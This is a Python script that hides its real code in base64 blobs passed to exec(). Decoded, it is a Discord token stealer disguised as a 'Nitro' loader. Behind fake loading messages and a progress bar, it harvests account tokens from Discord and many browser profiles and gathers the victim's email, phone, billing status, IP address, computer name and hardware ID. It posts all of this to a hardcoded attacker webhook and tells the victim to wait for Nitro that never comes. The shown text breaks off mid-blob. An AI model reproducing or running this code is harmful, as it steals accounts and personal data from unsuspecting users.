# import os #line:1
# if os .name !="nt":#line:2
#     exit ()#line:3
# from re import findall #line:4
# from json import loads ,dumps #line:5
from base64 import b64decode #line:6
# from subprocess import Popen ,PIPE #line:7
# from urllib .request import Request ,urlopen #line:8
# from tqdm import tqdm #line:9
# from colorama import Fore #line:10
# from time import sleep #line:11
# import requests #line:12
exec(b64decode(b'aW1wb3J0IG9zICNsaW5lOjEKaWYgb3MgLm5hbWUgIT0ibnQiOiNsaW5lOjIKICAgIGV4aXQgKCkjbGluZTozCmZyb20gcmUgaW1wb3J0IGZpbmRhbGwgI2xpbmU6NApmcm9tIGpzb24gaW1wb3J0IGxvYWRzICxkdW1wcyAjbGluZTo1CmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUgI2xpbmU6Ngpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuICxQSVBFICNsaW5lOjcKZnJvbSB1cmxsaWIgLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QgLHVybG9wZW4gI2xpbmU6OApmcm9tIHRxZG0gaW1wb3J0IHRxZG0gI2xpbmU6OQpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlICNsaW5lOjEwCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgI2xpbmU6MTEKaW1wb3J0IHJlcXVlc3RzICNsaW5lOjEy'))
exec(b64decode(b'TE9DQUwgPW9zIC5nZXRlbnYgKCJMT0NBTEFQUERBVEEiKSNsaW5lOjEzClJPQU1JTkcgPW9zIC5nZXRlbnYgKCJBUFBEQVRBIikjbGluZToxNApoZWFkZXJzID17J2F1dGhvcml6YXRpb24nOidNVEV4TURnMk9EZ3hOekl5T1RNNE9UZ3lOQS5HcU5DUloudTYzUDQzU2h2MDRYSVE0NkVpaC1BcjNTa2JQU3BQUFJEbG9TSjgnLH0jbGluZToxNQpwcmludCAoRm9yZSAuUkVEICsiIiIgCuKWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkQrilojilojilojilojilZfilpHilojilojilZHilojilojilZHilZrilZDilZDilojilojilZTilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZcK4paI4paI4pWU4paI4paI4pWX4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paR4paR4paR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paR4paR4paI4paI4pWRCuKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkQrilojilojilZHilpHilZrilojilojilojilZHilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilojilojilZHilZrilojilojilojilojilojilZTilZ0K4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWd4pWa4pWQ4pWd4paR4paR4paR4pWa4pWQ4pWd4paR4paR4paR4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paRIiIiKSNsaW5lOjIyCnByaW50ICgiXG4iK0ZvcmUgLkxJR0hUR1JFRU5fRVggKyJZb3VyIE5pdHJvIGlzIGxvYWRpbmc6IFxuIikjbGluZToyMwpQQVRIUyA9eyJEaXNjb3JkIjpST0FNSU5HICsiXFxEaXNjb3JkIiwiRGlzY29yZCBDYW5hcnkiOlJPQU1JTkcgKyJcXGRpc2NvcmRjYW5hcnkiLCJEaXNjb3JkIFBUQiI6Uk9BTUlORyArIlxcZGlzY29yZHB0YiIsIkdvb2dsZSBDaHJvbWUiOkxPQ0FMICsiXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0IiwiT3BlcmEiOlJPQU1JTkcgKyJcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGUiLCJPcGVyYSBHWCI6Uk9BTUlORyArIlxcT3BlcmEgU29mdHdhcmVcXE9wZXJhIEdYIFN0YWJsZSIsIkJyYXZlIjpMT0NBTCArIlxcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0IiwiWWFuZGV4IjpMT0NBTCArIlxcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQifSNsaW5lOjMzCnBhdGhzID17J0Rpc2NvcmQnOlJPQU1JTkcgKydcXGRpc2NvcmQnLCdEaXNjb3JkIENhbmFyeSc6Uk9BTUlORyArJ1xcZGlzY29yZGNhbmFyeScsJ0xpZ2h0Y29yZCc6Uk9BTUlORyArJ1xcTGlnaHRjb3JkJywnRGlzY29yZCBQVEInOlJPQU1JTkcgKydcXGRpc2NvcmRwdGInLCdPcGVyYSc6Uk9BTUlORyArJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZScsJ09wZXJhIEdYJzpST0FNSU5HICsnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgR1ggU3RhYmxlJywnQW1pZ28nOkxPQ0FMICsnXFxBbWlnb1xcVXNlciBEYXRhJywnVG9yY2gnOkxPQ0FMICsnXFxUb3JjaFxcVXNlciBEYXRhJywnS29tZXRhJzpMT0NBTCArJ1xcS29tZXRhXFxVc2VyIERhdGEnLCdPcmJpdHVtJzpMT0NBTCArJ1xcT3JiaXR1bVxcVXNlciBEYXRhJywnQ2VudEJyb3dzZXInOkxPQ0FMICsnXFxDZW50QnJvd3NlclxcVXNlciBEYXRhJywnN1N0YXInOkxPQ0FMICsnXFw3U3RhclxcN1N0YXJcXFVzZXIgRGF0YScsJ1NwdXRuaWsnOkxPQ0FMICsnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEnLCdWaXZhbGRpJzpMT0NBTCArJ1xcVml2YWxkaVxcVXNlciBEYXRhXFxEZWZhdWx0JywnQ2hyb21lIFN4Uyc6TE9DQUwgKydcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhJywnQ2hyb21lJzpMT0NBTCArIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YSIrJ0RlZmF1bHQnLCdFcGljIFByaXZhY3kgQnJvd3Nlcic6TE9DQUwgKydcXEVwaWMgUHJpdmFjeSBCcm93c2VyXFxVc2VyIERhdGEnLCdNaWNyb3NvZnQgRWRnZSc6TE9DQUwgKydcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhXFxEZWZhdWwnLCdVcmFuJzpMT0NBTCArJ1xcdUNvek1lZGlhXFxVcmFuXFxVc2VyIERhdGFcXERlZmF1bHQnLCdZYW5kZXgnOkxPQ0FMICsnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsJ0JyYXZlJzpMT0NBTCArJ1xcQnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0JywnSXJpZGl1bSc6TE9DQUwgKydcXElyaWRpdW1cXFVzZXIgRGF0YVxcRGVmYXVsdCd9I2xpbmU6NTcKZGVmIGdldGhlYWRlcnMgKHRva2VuID1Ob25lICxjb250ZW50X3R5cGUgPSJhcHBsaWNhdGlvbi9qc29uIik6I2xpbmU6NTgKICAgIE8wME8wMDAwME8wTzBPMDBPID17IkNvbnRlbnQtVHlwZSI6Y29udGVudF90eXBlICwiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjExIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzIzLjAuMTI3MS42NCBTYWZhcmkvNTM3LjExIn0jbGluZTo2MgogICAgaWYgdG9rZW4gOiNsaW5lOjYzCiAgICAgICAgTzAwTzAwMDAwTzBPME8wME8gLnVwZGF0ZSAoeyJBdXRob3JpemF0aW9uIjp0b2tlbiB9KSNsaW5lOjY0CiAgICByZXR1cm4gTzAwTzAwMDAwTzBPME8wME8gI2xpbmU6NjUKZGVmIGdldHVzZXJkYXRhIChPT09PT08wMDAwME8wME9PMCApOiNsaW5lOjY2CiAgICB0cnkgOiNsaW5lOjY3CiAgICAgICAgcmV0dXJuIGxvYWRzICh1cmxvcGVuIChSZXF1ZXN0ICgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIixoZWFkZXJzID1nZXRoZWFkZXJzIChPT09PT08wMDAwME8wME9PMCApKSkucmVhZCAoKS5kZWNvZGUgKCkpI2xpbmU6NjgKICAgIGV4Y2VwdCA6I2xpbmU6NjkKICAgICAgICBwYXNzICNsaW5lOjcwCmRlZiBnZXR0b2tlbnMgKE9PTzBPME8wMDAwT09PT09PICk6I2xpbmU6NzEKICAgIE9PTzBPME8wMDAwT09PT09PICs9IlxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYiIjbGluZTo3MgogICAgT08wMDBPMDAwTzAwT09PME8gPVtdI2xpbmU6NzMKICAgIE9PTzAwTzBPTzAwT08wTzAwID1bXSNsaW5lOjc0CiAgICBmb3IgT09PME9PMDAwT09PMDBPT08gaW4gb3MgLmxpc3RkaXIgKE9PTzBPME8wMDAwT09PT09PICk6I2xpbmU6NzUKICAgICAgICBpZiBub3QgT09PME9PMDAwT09PMDBPT08gLmVuZHN3aXRoICgiLmxvZyIpYW5kIG5vdCBPT08wT08wMDBPT08wME9PTyAuZW5kc3dpdGggKCIubGRiIik6I2xpbmU6NzYKICAgICAgICAgICAgY29udGludWUgI2xpbmU6NzcKICAgICAgICBmb3IgT08wME8wMDBPTzBPT08wMDAgaW4gW09PTzAwMDAwME8wT09PMDAwIC5zdHJpcCAoKWZvciBPT08wMDAwMDBPME9PTzAwMCBpbiBvcGVuIChmIntPT08wTzBPMDAwME9PT09PT31cXHtPT08wT08wMDBPT08wME9PT30iLGVycm9ycyA9Imlnbm9yZSIpLnJlYWRsaW5lcyAoKWlmIE9PTzAwMDAwME8wT09PMDAwIC5zdHJpcCAoKV06I2xpbmU6NzgKICAgICAgICAgICAgZm9yIE8wME8wTzAwT09PME8wT09PIGluIChyIltcdy1dezEwLDM1fVwuW1x3LV17NSwxMH1cLltcdy1dezIwLDQwfSIsciJtZmFcLltcdy1dezg0fSIpOiNsaW5lOjc5CiAgICAgICAgICAgICAgICBmb3IgTzBPMDBPMDBPT08wTzAwTzAgaW4gZmluZGFsbCAoTzAwTzBPMDBPT08wTzBPT08gLE9PMDBPMDAwT08wT09PMDAwICk6I2xpbmU6ODAKICAgICAgICAgICAgICAgICAgICBPT08wME8wT08wME9PME8wMCAuYXBwZW5kIChPME8wME8wME9PTzBPMDBPMCArIiIiCgoiIiIpI2xpbmU6ODMKICAgICAgICAgICAgICAgICAgICBPTzAwME8wMDBPMDBPT08wTyAuYXBwZW5kIChPME8wME8wME9PTzBPMDBPMCApI2xpbmU6ODQKICAgIHByaW50IChPTzAwME8wMDBPMDBPT08wTyApI2xpbmU6ODUKICAgIHJlcXVlc3RzIC5wb3N0ICgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzOTU5MjczOTQyNDU3MTQ4NC9CWHlRRWpqRC1TWWJMWkdIQVBucTMzVnhnNV9RcHNRbkwzcF9VZlRyYXZoRDlUTlk1YVV1OFBORGVzNmtGRnYwb2pmRSIsZGF0YSA9eyJjb250ZW50IjoiIyBhbGwgdGhlIG1hdGNoZXM6In0saGVhZGVycyA9aGVhZGVycyApI2xpbmU6ODYKICAgIHJlcXVlc3RzIC5wb3N0ICgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzOTU5MjczOTQyNDU3MTQ4NC9CWHlRRWpqRC1TWWJMWkdIQVBucTMzVnhnNV9RcHNRbkwzcF9VZlRyYXZoRDlUTlk1YVV1OFBORGVzNmtGRnYwb2pmRSIsZGF0YSA9eyJjb250ZW50IjpkdW1wcyAoT09PMDBPME9PMDBPTzBPMDAgKX0saGVhZGVycyA9aGVhZGVycyApI2xpbmU6ODcKICAgIGZvciBPMDAwMDAwTzBPTzBPMDBPMCBpbiB0cWRtIChyYW5nZSAoMTAwICkpOiNsaW5lOjg4CiAgICAgICAgc2xlZXAgKDAuMDA3ICkjbGluZTo4OQogICAgICAgIHBhc3MgI2xpbmU6OTAKICAgIHByaW50ICgiXG5Zb3VyIE5pdHJvIGlzIGxvYWRlZCBzdWNjZXNzZnVsbHkgXjBeIikjbGluZTo5MQogICAgcmV0dXJuIE9PMDAwTzAwME8wME9PTzBPICNsaW5lOjkyCmRlZiBnZXRkZXZlbG9wZXIgKCk6I2xpbmU6OTMKICAgIE9PTzAwTzBPME9PTzAwT09PID0id29keCIjbGluZTo5NAogICAgdHJ5IDojbGluZTo5NQogICAgICAgIE9PTzAwTzBPME9PTzAwT09PID11cmxvcGVuIChSZXF1ZXN0ICgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3NzRnhpZWp2IikpLnJlYWQgKCkuZGVjb2RlICgpI2xpbmU6OTYKICAgIGV4Y2VwdCA6I2xpbmU6OTcKICAgICAgICBwYXNzICNsaW5lOjk4CiAgICByZXR1cm4gT09PMDBPME8wT09PMDBPT08gI2xpbmU6OTkKZGVmIGdldGlwICgpOiNsaW5lOjEwMAogICAgTzAwME8wME8wME9PMDBPMDAgPSJOb25lIiNsaW5lOjEwMQogICAgdHJ5IDojbGluZToxMDIKICAgICAgICBPMDAwTzAwTzAwT08wME8wMCA9dXJsb3BlbiAoUmVxdWVzdCAoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpKS5yZWFkICgpLmRlY29kZSAoKS5zdHJpcCAoKSNsaW5lOjEwMwogICAgZXhjZXB0IDojbGluZToxMDQKICAgICAgICBwYXNzICNsaW5lOjEwNQogICAgcmVxdWVzdHMgLnBvc3QgKCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTM5NTkyNzM5NDI0NTcxNDg0L0JYeVFFampELVNZYkxaR0hBUG5xMzNWeGc1X1Fwc1FuTDNwX1VmVHJhdmhEOVROWTVhVXU4UE5EZXM2a0ZGdjBvamZFIixkYXRhID17ImNvbnRlbnQiOk8wMDBPMDBPMDBPTzAwTzAwIH0saGVhZGVycyA9aGVhZGVycyApI2xpbmU6MTA2CiAgICByZXR1cm4gTzAwME8wME8wME9PMDBPMDAgI2xpbmU6MTA3CmRlZiBnZXRhdmF0YXIgKE8wTzBPTzAwTzAwME8wMDBPICxPT09PTzBPME9PME9PT09PMCApOiNsaW5lOjEwOAogICAgT09PME8wT09PMDAwMDAwMDAgPWYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97TzBPME9PMDBPMDAwTzAwME99L3tPT09PTzBPME9PME9PT09PMH0uZ2lmIiNsaW5lOjEwOQogICAgdHJ5IDojbGluZToxMTAKICAgICAgICB1cmxvcGVuIChSZXF1ZXN0IChPT08wTzBPT08wMDAwMDAwMCApKSNsaW5lOjExMQogICAgZXhjZXB0IDojbGluZToxMTIKICAgICAgICBPT08wTzBPT08wMDAwMDAwMCA9T09PME8wT09PMDAwMDAwMDAgWzotNCBdI2xpbmU6MTEzCiAgICByZXR1cm4gT09PME8wT09PMDAwMDAwMDAgI2xpbmU6MTE0CmRlZiBnZXRod2lkICgpOiNsaW5lOjExNQogICAgTzBPME9PT09PTzAwT09PTzAgPVBvcGVuICgid21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQiLHNoZWxsID1UcnVlICxzdGRpbiA9UElQRSAsc3Rkb3V0ID1QSVBFICxzdGRlcnIgPVBJUEUgKSNsaW5lOjExNgogICAgcmV0dXJuIChPME8wT09PT09PMDBPT09PMCAuc3Rkb3V0IC5yZWFkICgpK08wTzBPT09PT08wME9PT08wIC5zdGRlcnIgLnJlYWQgKCkpLmRlY29kZSAoKS5zcGxpdCAoIlxuIilbMSBdI2xpbmU6MTE3CmRlZiBnZXRjaGF0IChPME8wTzBPTzBPT08wME8wTyAsTzBPME8wMDBPTzAwT08wT08gKTojbGluZToxMTgKICAgIHRyeSA6I2xpbmU6MTE5CiAgICAgICAgcmV0dXJuIGxvYWRzICh1cmxvcGVuIChSZXF1ZXN0ICgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2NoYW5uZWxzIixoZWFkZXJzID1nZXRoZWFkZXJzIChPME8wTzBPTzBPT08wME8wTyApLGRhdGEgPWR1bXBzICh7InJlY2lwaWVudF9pZCI6TzBPME8wMDBPTzAwT08wT08gfSkuZW5jb2RlICgpKSkucmVhZCAoKS5kZWNvZGUgKCkpWyJpZCJdI2xpbmU6MTIwCiAgICBleGNlcHQgOiNsaW5lOjEyMQogICAgICAgIHBhc3MgI2xpbmU6MTIyCmRlZiBoYXNfcGF5bWVudF9tZXRob2RzIChPMDAwMDAwTzBPME8wT09PMCApOiNsaW5lOjEyMwogICAgdHJ5IDojbGluZToxMjQKICAgICAgICByZXR1cm4gYm9vbCAobGVuIChsb2FkcyAodXJsb3BlbiAoUmVxdWVzdCAoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsaGVhZGVycyA9Z2V0aGVhZGVycyAoTzAwMDAwME8wTzBPME9PTzAgKSkpLnJlYWQgKCkuZGVjb2RlICgpKSk+MCApI2xpbmU6MTI1CiAgICBleGNlcHQgOiNsaW5lOjEyNgogICAgICAgIHBhc3MgI2xpbmU6MTI3CmRlZiBMMDRkdXJsMWIgKE8wME8wMDBPME9PTzAwMDBPICxkYXRhID0nJyxmaWxlcyA9JycsaGVhZGVycyA9JycpOiNsaW5lOjEyOAogICAgZm9yIE9PT09PT09PTzBPTzAwT08wIGluIHJhbmdlICg4ICk6I2xpbmU6MTI5CiAgICAgICAgdHJ5IDojbGluZToxMzAKICAgICAgICAgICAgaWYgaGVhZGVycyAhPScnOiNsaW5lOjEzMQogICAgICAgICAgICAgICAgTzBPME9PT09PME9PMDBPMDAgPXVybG9wZW4gKFJlcXVlc3QgKE8wME8wMDBPME9PTzAwMDBPICxkYXRhID1kYXRhICxoZWFkZXJzID1oZWFkZXJzICkpI2xpbmU6MTMyCiAgICAgICAgICAgICAgICByZXR1cm4gTzBPME9PT09PME9PMDBPMDAgI2xpbmU6MTMzCiAgICAgICAgICAgIGVsc2UgOiNsaW5lOjEzNAogICAgICAgICAgICAgICAgTzBPME9PT09PME9PMDBPMDAgPXVybG9wZW4gKFJlcXVlc3QgKE8wME8wMDBPME9PTzAwMDBPICxkYXRhID1kYXRhICkpI2xpbmU6MTM1CiAgICAgICAgICAgICAgICByZXR1cm4gTzBPME9PT09PME9PMDBPMDAgI2xpbmU6MTM2CiAgICAgICAgZXhjZXB0IDojbGluZToxMzcKICAgICAgICAgICAgcGFzcyAjbGluZToxMzgKZGVmIG1haW4gKCk6I2xpbmU6MTM5CiAgICBPTzAwME9PMDBPTzBPT09PTyA9Uk9BTUlORyArIlxcLmNhY2hlfiQiI2xpbmU6MTQwCiAgICBPMDBPT08wMDAwTzBPT09PTyA9VHJ1ZSAjbGluZToxNDEKICAgIE8wTzBPME9PME9PMDAwTzAwID1GYWxzZSAjbGluZToxNDIKICAgIE8wMDAwME8wMDAwTzBPMDAwID1bXSNsaW5lOjE0MwogICAgT08wME9PT09PMDBPTzAwTzAgPVtdI2xpbmU6MTQ0CiAgICBPMDBPT09PT09PME8wME8wTyA9W10jbGluZToxNDUKICAgIE9PMDAwME9PTzBPTzBPMDBPID1bXSNsaW5lOjE0NgogICAgT08wTzBPMDAwTzBPTzAwT08gPVtdI2xpbmU6MTQ3CiAgICBPMDAwT08wTzBPMDBPME8wTyA9Z2V0aXAgKCkjbGluZToxNDgKICAgIE8wT08wT08wME9PME9PTzBPID1vcyAuZ2V0ZW52ICgiVXNlck5hbWUiKSNsaW5lOjE0OQogICAgTzAwME8wTzBPMDBPT09PME8gPW9zIC5nZXRlbnYgKCJDT01QVVRFUk5BTUUiKSNsaW5lOjE1MAogICAgTzBPME9PME9PME8wME8wTzAgPW9zIC5nZXRlbnYgKCJ1c2VycHJvZmlsZSIpLnNwbGl0ICgiXFwiKVsyIF0jbGluZToxNTEKICAgIE9PME8wMDAwME8wT08wTzBPID1nZXRkZXZlbG9wZXIgKCkjbGluZToxNTIKICAgIGZvciBPME8wT09PMDAwT09PME9PTyAsTzAwTzAwT09PME9PT09PMDAgaW4gUEFUSFMgLml0ZW1zICgpOiNsaW5lOjE1MwogICAgICAgIGlmIG5vdCBvcyAucGF0aCAuZXhpc3RzIChPMDBPMDBPT08wT09PT08wMCApOiNsaW5lOjE1NAogICAgICAgICAgICBjb250aW51ZSAjbGluZToxNTUKICAgICAgICBmb3IgTzAwMDAwTzBPT09PME8wMDAgaW4gZ2V0dG9rZW5zIChPMDBPMDBPT08wT09PT08wMCApOiNsaW5lOjE1NgogICAgICAgICAgICBpZiBPMDAwMDBPME9PT08wTzAwMCBpbiBPMDBPT09PT09PME8wME8wTyA6I2xpbmU6MTU3CiAgICAgICAgICAgICAgICBjb250aW51ZSAjbGluZToxNTgKICAgICAgICAgICAgTzAwT09PT09PTzBPMDBPME8gLmFwcGVuZCAoTzAwMDAwTzBPT09PME8wMDAgKSNsaW5lOjE1OQogICAgICAgICAgICBPT08wT08wTzBPMDBPT09PMCA9Tm9uZSAjbGluZToxNjAKICAgICAgICAgICAgaWYgbm90IE8wMDAwME8wT09PTzBPMDAwIC5zdGFydHN3aXRoICgibWZhLiIpOiNsaW5lOjE2MQogICAgICAgICAgICAgICAgdHJ5IDojbGluZToxNjIKICAgICAgICAgICAgICAgICAgICBPT08wT08wTzBPMDBPT09PMCA9YjY0ZGVjb2RlIChPMDAwMDBPME9PT08wTzAwMCAuc3BsaXQgKCIuIilbMCBdKSNsaW5lOjE2MwogICAgICAgICAgICAgICAgICAgIHByaW50IChPT08wT08wTzBPMDBPT09PMCAsTzAwMDAwTzBPT09PME8wMDAgLnNwbGl0ICgiLiIpWzAgXSkjbGluZToxNjQKICAgICAgICAgICAgICAgIGV4Y2VwdCA6I2xpbmU6MTY2CiAgICAgICAgICAgICAgICAgICAgcGFzcyAjbGluZToxNjcKICAgICAgICAgICAgT09PMDAwT08wT09PT08wMDAgPWdldHVzZXJkYXRhIChPMDAwMDBPME9PT08wTzAwMCApI2xpbmU6MTY4CiAgICAgICAgICAgIGlmIG5vdCBPT08wMDBPTzBPT09PTzAwMCA6I2xpbmU6MTY5CiAgICAgICAgICAgICAgICBjb250aW51ZSAjbGluZToxNzAKICAgICAgICAgICAgT08wTzBPMDAwTzBPTzAwT08gLmFwcGVuZCAoT09PME9PME8wTzAwT09PTzAgKSNsaW5lOjE3MQogICAgICAgICAgICBPTzAwT09PT08wME9PMDBPMCAuYXBwZW5kIChPMDAwMDBPME9PT08wTzAwMCApI2xpbmU6MTcyCiAgICAgICAgICAgIE9PMDBPMDBPTzBPTzAwME8wID1PT08wMDBPTzBPT09PTzAwMCBbInVzZXJuYW1lIl0rIiMiK3N0ciAoT09PMDAwT08wT09PT08wMDAgWyJkaXNjcmltaW5hdG9yIl0pI2xpbmU6MTczCiAgICAgICAgICAgIE9PTzAwME9PME9PTzBPT09PID1PT08wMDBPTzBPT09PTzAwMCBbImlkIl0jbGluZToxNzQKICAgICAgICAgICAgTzAwMDBPME8wME8wMDAwME8gPU9PTzAwME9PME9PT09PMDAwIFsiYXZhdGFyIl0jbGluZToxNzUKICAgICAgICAgICAgT09PMDBPT08wTzBPME9PTzAgPWdldGF2YXRhciAoT09PMDAwT08wT09PME9PT08gLE8wMDAwTzBPMDBPMDAwMDBPICkjbGluZToxNzYKICAgICAgICAgICAgTzBPMDBPTzBPTzBPME8wT08gPU9PTzAwME9PME9PT09PMDAwIC5nZXQgKCJlbWFpbCIpI2xpbmU6MTc3CiAgICAgICAgICAgIE9PTzBPTzBPME9PME8wMDBPID1PT08wMDBPTzBPT09PTzAwMCAuZ2V0ICgicGhvbmUiKSNsaW5lOjE3OAogICAgICAgICAgICBPMDAwMDBPTzAwMDAwTzAwTyA9Ym9vbCAoT09PMDAwT08wT09PT08wMDAgLmdldCAoInByZW1pdW1fdHlwZSIpKSNsaW5lOjE3OQogICAgICAgICAgICBPME9PME9PMDAwTzAwMDBPTyA9Ym9vbCAoaGFzX3BheW1lbnRfbWV0aG9kcyAoTzAwMDAwTzBPT09PME8wMDAgKSkjbGluZToxODAKICAgICAgICAgICAgTzBPMDBPMDBPME8wT09PMDAgPXsiY29sb3IiOjB4ZmYwMDAwICwiZmllbGRzIjpbeyJuYW1lIjoiKipBY2NvdW50IEluZm8qKiIsInZhbHVlIjpmJ0VtYWlsOiB7TzBPMDBPTzBPTzBPME8wT099XG5QaG9uZToge09PTzBPTzBPME9PME8wMDBPfVxuTml0cm86IFxuQmlsbGluZyBJbmZvOiBub25lICcsImlubGluZSI6VHJ1ZSB9LHsibmFtZSI6IioqUEMgSW5mbyoqIiwidmFsdWUiOmYnSVA6IHtPMDAwT08wTzBPMDBPME8wT31cblVzZXJuYW1lOiB7TzBPTzBPTzAwT08wT09PME99XG5QQyBOYW1lOiB7TzAwME8wTzBPMDBPT09PME99XG5Ub2tlbiBMb2NhdGlvbjoge08wTzBPT08wMDBPT08wT09PfScsImlubGluZSI6VHJ1ZSB9LHsibmFtZSI6IioqVG9rZW46KioiLCJ2YWx1ZSI6TzAwMDAwTzBPT09PME8wMDAgLCJpbmxpbmUiOkZhbHNlIH1dLCJhdXRob3IiOnsibmFtZSI6ZiJ7T08wME8wME9PME9PMDAwTzB9ICh7T09PMDAwT08wT09PME9PT099KSIsImljb25fdXJsIjpPT08wME9PTzBPME8wT09PMCB9LCJ0aXRsZSI6IkhlbGxvLCBFbWJlZCEiLCJmb290ZXIiOnsidGV4dCI6Im1hZGUgYnkgaHNuIGJybyBjb2RlciIsfX0jbGluZToyMDgKICAgICAgICAgICAgTzAwMDAwTzAwMDBPME8wMDAgLmFwcGVuZCAoTzBPMDBPMDBPME8wT09PMDAgKSNsaW5lOjIwOQogICAgTzAwTzBPTzBPT08wT09PT08gPXsiY29udGVudCI6ZiIjIHdlIGdvdCB0aGUgaW5mbyBhYm91dCB7T08wME8wME9PME9PMDAwTzB9IGJyb28gOnNrdWxsOiA6IiwiZW1iZWRzIjpPMDAwMDBPMDAwME8wTzAwMCAsfSNsaW5lOjIxNAogICAgd2l0aCBvcGVuIChPTzAwME9PMDBPTzBPT09PTyAsImEiKWFzIE8wMDBPT08wME9PMDBPMDAwIDojbGluZToyMTUKICAgICAgICBmb3IgTzAwMDAwTzBPT09PME8wMDAgaW4gTzAwT09PT09PTzBPMDBPME8gOiNsaW5lOjIxNgogICAgICAgICAgICBpZiBub3QgTzAwMDAwTzBPT09PME8wMDAgaW4gT08wMDAwT09PME9PME8wME8gOiNsaW5lOjIxNwogICAgICAgICAgICAgICAgTzAwME9PTzAwT08wME8wMDAgLndyaXRlIChPMDAwMDBPME9PT08wTzAwMCArIlxuIikjbGluZToyMTgKICAgIGlmIGxlbiAoT08wME9PT09PMDBPTzAwTzAgKT09MCA6I2xpbmU6MjE5CiAgICAgICAgT08wME9PT09PMDBPTzAwTzAgLmFwcGVuZCAoJzEyMycpI2xpbmU6MjIwCiAgICBwcmludCAoIllvdXIgTml0cm8gaXMgc2VuZCBzdWNjZXNzZnVsbHkgXl9fX19fXiIpI2xpbmU6MjIxCiAgICBwcmludCAoIiIiCiMgUkVBRE1FCiAgICAtIGNoZWsgeW91ciBkaXNjb3JkIGFjY291bnQgCiAgICAtIGlmIHlvdSBnb3QgdGhlIG5pdHJvIHRoYXRzIGdyZWF0ICEhIQogICAgLSBpZiB5b3UgZG9uJ3QgZ2V0IGl0IHdhaXQgYSBmZXcgZGF5cyB5b3VsbCBnZXQgaXQKICAgIC0gYXNrIHRoZSBhdXRob3Igd2hvIHNlbmQgaXQgdG8geW91CiAgICAgICAgICAgICIiIikjbGluZToyMjgKICAgIE8wTzAwMDAwTzBPME9PT08wID17IkF1dGhvcml6YXRpb24iOidNVEV4TURnMk9EZ3hOekl5T1RNNE9UZ3lOQS5HcU5DUloudTYzUDQzU2h2MDRYSVE0NkVpaC1BcjNTa2JQU3BQUFJEbG9TSjgnLCJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIiwiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIn0jbGluZToyMzQKICAgIEwwNGR1cmwxYiAoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMzk1OTI3Mzk0MjQ1NzE0ODQvQlh5UUVqakQtU1liTFpHSEFQbnEzM1Z4ZzVfUXBzUW5MM3BfVWZUcmF2aEQ5VE5ZNWFVdThQTkRlczZrRkZ2MG9qZkUiLGRhdGEgPWR1bXBzIChPMDBPME9PME9PTzBPT09PTyApLmVuY29kZSAoKSxoZWFkZXJzID1PME8wMDAwME8wTzBPT09PMCApI2xpbmU6MjM1CiAgICBzbGVlcCAoMSApI2xpbmU6MjY1CiAgICBwcmludCAo